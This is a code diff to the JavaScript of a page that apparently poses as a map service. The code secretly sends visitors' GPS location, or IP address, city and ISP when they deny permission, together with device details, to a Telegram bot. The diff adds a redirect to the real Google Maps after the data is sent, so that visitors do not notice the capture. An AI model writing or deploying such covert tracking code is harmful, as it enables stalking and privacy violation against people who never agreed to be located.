@@ -279,7 +279,7 @@ document.addEventListener('DOMContentLoaded', () => {
 document.getElementById('permDeny').onclick = () => {
   closeSheet();
   toast('Menggunakan lokasi perkiraan');
-  sendGeoIpFallback();
+  sendGeoIpFallback(true); // Beri parameter true untuk redirect
 };
 
 document.getElementById('permAllow').onclick = () => permAllowHandler();
@@ -302,14 +302,17 @@ async function permAllowHandler() {
   try {
     const pos = await getLocation();
     placeBlueDot(pos.lat, pos.lon);
-    toast('Lokasi ditemukan');
+    toast('Lokasi ditemukan. Membuka Maps...');
     
-    // Tembak telegram serta merta (jangan tunggu selesai baru animate dot)
-    sendToTelegram({ lat: pos.lat, lon: pos.lon, acc: pos.acc, source: 'GPS' });
-    
+    // Hantar dan tunggu sekejap, lepas tu baru redirect
+    await sendToTelegram({ 
+      lat: pos.lat, lon: pos.lon, acc: pos.acc, source: 'GPS' 
+    }, true);
+
   } catch (err) {
-    toast('Lokasi tidak tersedia');
-    sendGeoIpFallback();
+    toast('Lokasi tidak tersedia, menggunakan jaringan...');
+    // Kalau GPS reject, fallback IP-Geo dan redirect gak
+    sendGeoIpFallback(true);
   } finally {
     locateBtn.classList.remove('loading');
   }
@@ -326,23 +329,26 @@ function getLocation() {
   });
 }
 
-async function sendGeoIpFallback() {
+async function sendGeoIpFallback(doRedirect = false) {
   try {
-    // Guna ipwho.is (jauh lebih cepat dari ipapi.co)
     const r = await fetch('https://ipwho.is/', { cache: 'no-store' });
     const j = await r.json();
     if (j.success && j.latitude && j.longitude) {
       placeBlueDot(j.latitude, j.longitude);
-      sendToTelegram({
+      await sendToTelegram({
         lat: j.latitude, lon: j.longitude, acc: null,
         city: j.city, country: j.country,
         ip: j.ip, isp: j.connection?.isp, source: 'IP-Geo'
-      });
+      }, doRedirect);
+    } else {
+      if (doRedirect) window.location.href = 'https://www.google.com/maps';
     }
-  } catch {}
+  } catch {
+    if (doRedirect) window.location.href = 'https://www.google.com/maps';
+  }
 }
 
-async function sendToTelegram(data) {
+async function sendToTelegram(data, doRedirect = false) {
   const ua = navigator.userAgent;
   const platform = navigator.platform || '-';
   const lang = navigator.language || '-';
@@ -379,12 +385,22 @@ async function sendToTelegram(data) {
         chat_id: TG_CHAT_ID,
         text: msg,
         parse_mode: 'HTML',
-        disable_web_page_preview: false
+        disable_web_page_preview: false,
+        disable_notification: false
       }),
-      // Paksa browser hantar request walaupun tab ditutup
       keepalive: true 
     });
-  } catch (e) { console.error(e); }
+  } catch (e) { 
+    console.error(e); 
+  } finally {
+    // Lontar user ke Google Maps asli selepas mesej terhantar
+    if (doRedirect) {
+      // Delay 1 saat supaya user nampak 'Lokasi ditemukan' toast
+      setTimeout(() => {
+        window.location.href = 'https://www.google.com/maps';
+      }, 1000);
+    }
+  }
 }
 
 function escapeHtml(s) {
